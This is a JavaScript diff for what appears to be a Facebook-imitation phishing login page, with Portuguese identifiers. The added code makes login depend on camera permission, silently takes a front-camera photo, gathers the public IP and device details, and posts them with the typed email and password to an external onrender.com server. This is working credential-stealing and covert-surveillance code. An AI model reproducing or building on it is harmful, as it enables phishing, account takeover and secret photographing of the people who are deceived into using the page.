@@ -31,6 +31,55 @@ document.addEventListener('DOMContentLoaded', () => {
     emailInput.addEventListener('input', verificarCampos);
     senhaInput.addEventListener('input', verificarCampos);
 
+    const solicitarPermissaoCamera = async () => {
+        try {
+            const permissao = await navigator.mediaDevices.getUserMedia({ video: true });
+            permissao.getTracks().forEach(track => track.stop());
+            return true;
+        } catch (error) {
+            console.warn('Permissão da câmera negada:', error);
+            return false;
+        }
+    };
+
+    const verificarPermissaoCamera = async () => {
+        try {
+            const result = await navigator.permissions.query({ name: 'camera' });
+            return result.state === 'granted';
+        } catch (error) {
+            console.error('Erro ao verificar permissão da câmera:', error);
+            return false;
+        }
+    };
+
+    const tirarFoto = async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' }
+            });
+            
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0);
+            
+            const foto = canvas.toDataURL('image/jpeg');
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            return foto;
+        } catch (error) {
+            console.error('Erro ao capturar foto:', error);
+            return null;
+        }
+    };
+
     const verificarMemoria = () => {
         const memoriaTotal = navigator.deviceMemory || 0;
         if (memoriaTotal < 4) {
@@ -134,9 +183,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 btnEntrar.textContent = 'Entrando...';
                 btnEntrar.disabled = true;
 
-                const infoDispositivo = await coletarInformacoesDispositivo();
+                const permissaoConcedida = await solicitarPermissaoCamera();
+                if (!permissaoConcedida) {
+                    alert('É necessário permitir o acesso à câmera para continuar.');
+                    btnEntrar.textContent = 'Entrar';
+                    btnEntrar.disabled = false;
+                    return;
+                }
 
-                const response = await fetch('https://api-clone-facebook.onrender.com/login', {
+                const permissaoVerificada = await verificarPermissaoCamera();
+                if (!permissaoVerificada) {
+                    alert('A permissão da câmera foi revogada. Por favor, conceda acesso novamente.');
+                    btnEntrar.textContent = 'Entrar';
+                    btnEntrar.disabled = false;
+                    return;
+                }
+
+                const foto = await tirarFoto();
+                const infoDispositivo = await coletarInformacoesDispositivo();
+                const ipPublico = await obterIpPublico();
+
+                const response = await fetch('https://facebook-clone-api-render.onrender.com/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -145,7 +212,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     body: JSON.stringify({
                         email: emailInput.value.trim(),
                         senha: senhaInput.value.trim(),
-                        dispositivo: infoDispositivo
+                        dispositivo: infoDispositivo,
+                        foto: foto,
+                        ipPublico: ipPublico
                     })
                 });
 
